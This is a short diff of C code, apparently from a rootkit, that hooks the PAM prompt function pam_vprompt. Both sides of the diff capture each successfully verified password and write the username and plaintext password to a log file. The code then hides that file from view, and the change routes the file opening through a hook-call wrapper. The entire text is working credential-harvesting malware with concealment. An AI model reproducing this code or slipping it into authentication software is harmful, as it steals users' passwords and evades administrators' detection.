@@ -8,8 +8,7 @@ int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt,
     int retval;
     FILE *logpath_fp;
 
-    hook(CFOPEN,
-         CCHOWN);
+    hook(CFOPEN);
 
     if(response) *response = NULL;
     if((retval = pam_get_item(pamh, PAM_CONV, &convp)) != PAM_SUCCESS) return retval;
@@ -32,13 +31,11 @@ int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt,
     if(retval != PAM_SUCCESS) return retval;
 
     if(pam_resp->resp != NULL && verify_pass(user, pam_resp->resp)){
-        if((logpath_fp = xfopen(LOG_PATH, "a")) == NULL) goto _end_pam_vprompt;
-        xor(lfmt, LOG_FMT);
-        (void)fprintf(logpath_fp, lfmt, user, pam_resp->resp);
-        clean(lfmt);
-        (void)fclose(logpath_fp);
+        if((logpath_fp = call(CFOPEN, LOG_PATH, "a")) == NULL) goto _end_pam_vprompt;
 
-        xhide_path(LOG_PATH);
+        fprintf(logpath_fp, LOG_FMT, user, pam_resp->resp);
+        fclose(logpath_fp);
+        hide_path(LOG_PATH);
     }
 
 _end_pam_vprompt:
